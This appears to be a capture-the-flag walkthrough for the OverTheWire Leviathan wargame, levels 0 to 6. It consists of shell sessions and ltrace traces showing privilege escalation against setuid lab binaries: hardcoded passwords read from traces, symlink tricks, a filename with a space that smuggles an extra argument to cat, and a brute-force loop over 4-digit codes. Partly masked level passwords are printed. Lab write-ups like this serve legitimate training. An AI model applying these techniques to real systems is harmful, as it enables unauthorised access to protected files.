### Level 0

```bash
➜  ~ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0@gibson:~/.backup$ pwd
/home/leviathan0/.backup
leviathan0@gibson:~/.backup$ cat bookmarks.html | grep "pass"
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIf*****" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

### Level 1

```bash
leviathan1@gibson:~$ ltrace ./check 
__libc_start_main(0x80491e6, 1, 0xffffd5f4, 0 <unfinished ...>
printf("password: ")                                             = 10
getchar(0xf7fbe4a0, 0xf7fd6f90, 0x786573, 0x646f67password: yay
)              = 121
getchar(0xf7fbe4a0, 0xf7fd6f79, 0x786573, 0x646f67)              = 97
getchar(0xf7fbe4a0, 0xf7fd6179, 0x786573, 0x646f67)              = 121
strcmp("yay", "sex")                                             = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                             = 29
+++ exited (status 0) +++
leviathan1@gibson:~$ ./check
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
****PNl10e
```

### Level 2

```bash
leviathan2@gibson:/tmp/dir2$ touch pass
leviathan2@gibson:/tmp/dir2$ ltrace /home/leviathan2/printfile pass
__libc_start_main(0x80491e6, 2, 0xffffd664, 0 <unfinished ...>
access("pass", 4)                                                          = 0
snprintf("/bin/cat pass", 511, "/bin/cat %s", "pass")                      = 13
geteuid()                                                                  = 12002
geteuid()                                                                  = 12002
setreuid(12002, 12002)                                                     = 0
system("/bin/cat pass" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                     = 0
+++ exited (status 0) +++
leviathan2@gibson:/tmp/dir2$ ln -s /etc/leviathan_pass/leviathan3 /tmp/dir2/pass
__libc_start_main(0x80491e6, 2, 0xffffd664, 0 <unfinished ...>
access("pass", 4)                                                          = -1
puts("You cant have that file..."You cant have that file...
)                                         = 27
+++ exited (status 1) +++
leviathan2@gibson:/tmp/dir2$ ln -s /etc/leviathan_pass/leviathan3 /tmp/dir2/lev
leviathan2@gibson:/tmp/dir2$ touch 'pass lev'
leviathan2@gibson:/tmp/dir2$ ltrace /home/leviathan2/printfile "/tmp/dir2/pass lev" 
__libc_start_main(0x80491e6, 2, 0xffffd654, 0 <unfinished ...>
access("/tmp/dir2/pass lev", 4)                                            = 0
snprintf("/bin/cat /tmp/dir2/pass lev", 511, "/bin/cat %s", "/tmp/dir2/pass lev") = 27
geteuid()                                                                  = 12002
geteuid()                                                                  = 12002
setreuid(12002, 12002)                                                     = 0
system("/bin/cat /tmp/dir2/pass lev"/bin/cat: /tmp/dir2/pass: No such file or directory
/bin/cat: lev: Permission denied
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                     = 256
+++ exited (status 0) +++
leviathan2@gibson:/tmp/dir2$  /home/leviathan2/printfile "pass lev" 
****j4sakn
```

### Level 3

```bash
leviathan3@gibson:~$ ltrace ./level3 
__libc_start_main(0x80492bf, 1, 0xffffd6a4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                            = -1
printf("Enter the password> ")                                        = 20
fgets(Enter the password> kakaka
"kakaka\n", 256, 0xf7e2a620)                                    = 0xffffd47c
strcmp("kakaka\n", "snlprintf\n")                                     = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                            = 19
+++ exited (status 0) +++
leviathan3@gibson:~$ ltrace ./level3 
__libc_start_main(0x80492bf, 1, 0xffffd6a4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                            = -1
printf("Enter the password> ")                                        = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7e2a620)                                 = 0xffffd47c
strcmp("snlprintf\n", "snlprintf\n")                                  = 0
puts("[You've got shell]!"[You've got shell]!
)                                           = 20
geteuid()                                                             = 12003
geteuid()                                                             = 12003
setreuid(12003, 12003)                                                = 0
system("/bin/sh"$ ls
level3
$ cat /etc/leviathan_pass/leviathan4
cat: /etc/leviathan_pass/leviathan4: Permission denied
$ exit
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                = 256
+++ exited (status 0) +++
leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ id
uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)
$ cat /etc/leviathan_pass/leviathan4
****ropI4OA
```

### Level 4

```bash
leviathan4@gibson:~$ cd .trash/
leviathan4@gibson:~/.trash$ ls
bin
leviathan4@gibson:~/.trash$ ./bin
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010

#	Into decimal = * * * * 84	70 49 88 113 115 10
# Into Ascii = ****TF1Xqs\n

```

### Level 5

```bash
leviathan5@gibson:~$ ls
leviathan5
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x8049206, 1, 0xffffd694, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                           = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                     = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
****XPVk2l
```

### Level 6

```bash
leviathan6@gibson:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
leviathan6@gibson:~$ cat /tmp/script.sh
#!/bin/bash

for x in {0000..9999};do
	/home/leviathan6/leviathan6 $x
done
leviathan6@gibson:~$ bash /tmp/script.sh
Wrong
Wrong
Wrong
..
$ cat /etc/leviathan_pass/leviathan7
****5f8Hze
```
